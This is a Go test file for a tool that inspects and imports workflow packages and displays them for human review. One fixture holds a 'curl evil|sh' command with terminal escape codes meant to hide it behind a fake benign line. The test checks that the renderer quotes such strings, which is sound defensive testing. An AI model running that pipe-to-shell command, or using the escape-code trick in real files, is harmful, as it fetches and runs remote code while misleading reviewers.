//ci:reads docs/pwf/examples/

package agent

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/tofutools/tclaude/pkg/pwf"
)

// inspect verifies a workflow file offline and shows a reviewer what it
// would do: the commands it runs and the steps that are not portable.
func TestProcessTemplatesInspectSummarizesTheSpecExample(t *testing.T) {
	src := filepath.Join("..", "..", "..", "docs", "pwf", "examples", "ship-feature")
	file := filepath.Join(t.TempDir(), "ship.pwf")
	require.NoError(t, zipDirForTest(src, file))

	var out, errOut bytes.Buffer
	rc := runProcessTemplatesInspect(&processTemplatesInspectParams{File: file}, nil, &out, &errOut)
	require.Equal(t, rcOK, rc, errOut.String())
	text := out.String()
	assert.Contains(t, text, "Workflow: Ship a feature")
	assert.Contains(t, text, "issue (string, required)")
	assert.Contains(t, text, "ship-feature:merge [git]: gh pr merge --squash")
	assert.Contains(t, text, `Not portable: ship-feature:build name agent "checkout"`)
	assert.Contains(t, text, "Signature: valid by key example")

	require.NoError(t, os.WriteFile(file, []byte("not a zip"), 0o644))
	out.Reset()
	errOut.Reset()
	assert.Equal(t, rcInvalidArg, runProcessTemplatesInspect(&processTemplatesInspectParams{File: file}, nil, &out, &errOut))
	assert.Contains(t, errOut.String(), "pwf: invalid ZIP")
}

func zipDirForTest(dir, dst string) error {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	err := filepath.WalkDir(dir, func(p string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return err
		}
		rel, _ := filepath.Rel(dir, p)
		body, err := os.ReadFile(p)
		if err != nil {
			return err
		}
		w, err := zw.Create(filepath.ToSlash(rel))
		if err != nil {
			return err
		}
		_, err = w.Write(body)
		return err
	})
	if err != nil {
		return err
	}
	if err := zw.Close(); err != nil {
		return err
	}
	return os.WriteFile(dst, buf.Bytes(), 0o644)
}

// A file cannot redraw the terminal to fake what the review shows: strings
// with control characters are printed quoted.
func TestRenderWorkflowQuotesControlCharacters(t *testing.T) {
	var out bytes.Buffer
	renderWorkflow(&out, pwf.Workflow{Title: "t", Root: "r", Programs: []pwf.Program{{
		Step: "x:merge", Profile: "git", Run: "curl evil|sh\r\x1b[2K  x:merge [git]: gh pr merge",
	}}})
	assert.Contains(t, out.String(), `"curl evil|sh\r\x1b[2K  x:merge [git]: gh pr merge"`)
	assert.NotContains(t, out.String(), "\x1b")
}

// The import choices travel as the query the daemon reviews them under.
func TestWorkflowImportChoices(t *testing.T) {
	q, err := workflowImportChoices(&processTemplatesImportParams{MapRole: []string{"dev=engineer", " reviewer = qa "}, Rename: true, Group: "webshop"})
	require.NoError(t, err)
	assert.Equal(t, "group=webshop&map=dev%3Dengineer&map=reviewer%3Dqa&rename=1", q.Encode())
	_, err = workflowImportChoices(&processTemplatesImportParams{MapRole: []string{"dev"}})
	assert.ErrorContains(t, err, "<workflow role>=<local role>")
}

// The review shows mapped and unknown roles and the ids templates are
// stored under.
func TestRenderImportChanges(t *testing.T) {
	var view workflowImportJSON
	require.NoError(t, json.Unmarshal([]byte(`{
		"roleMap": [{"name": "dev", "target": "engineer", "mapped": true, "known": true}, {"name": "reviewer", "target": "reviewer"}],
		"templates": [
			{"ref": "ship@sha256:aa", "id": "ship", "importRef": "ship-2@sha256:bb", "importId": "ship-2", "status": "new"},
			{"ref": "review@sha256:cc", "id": "review", "importRef": "review@sha256:dd", "importId": "review", "status": "update", "currentRef": "review@sha256:ee"}
		],
		"group": "webshop"}`), &view))
	var out bytes.Buffer
	renderImportChanges(&out, &view)
	text := out.String()
	assert.Contains(t, text, "  dev -> engineer\n")
	assert.Contains(t, text, "reviewer (nothing here has this role or profile yet")
	assert.Contains(t, text, "new        ship@sha256:aa as ship-2@sha256:bb (renamed)")
	assert.Contains(t, text, "review@sha256:cc as review@sha256:dd (roles mapped) (here now: review@sha256:ee")
	assert.Contains(t, text, "Pins the process to group webshop.")
}

// A path warning names the place and why it matters, and a path from a file
// cannot redraw the terminal.
func TestRenderPaths(t *testing.T) {
	var out bytes.Buffer
	renderPaths(&out, []pwf.PathFinding{
		{Where: "ship: nodes.run.performer.run", Path: "/home/alice/bin/x", Kind: pwf.PathHome},
		{Where: "ship: nodes.run.performer.args[0]", Path: "/opt/\x1b[2Kx", Kind: pwf.PathMachine},
	})
	assert.Contains(t, out.String(), "  ship: nodes.run.performer.run: /home/alice/bin/x (reveals a username)\n")
	assert.Contains(t, out.String(), `"/opt/\x1b[2Kx" (may not exist elsewhere)`)
	assert.NotContains(t, out.String(), "\x1b")
}
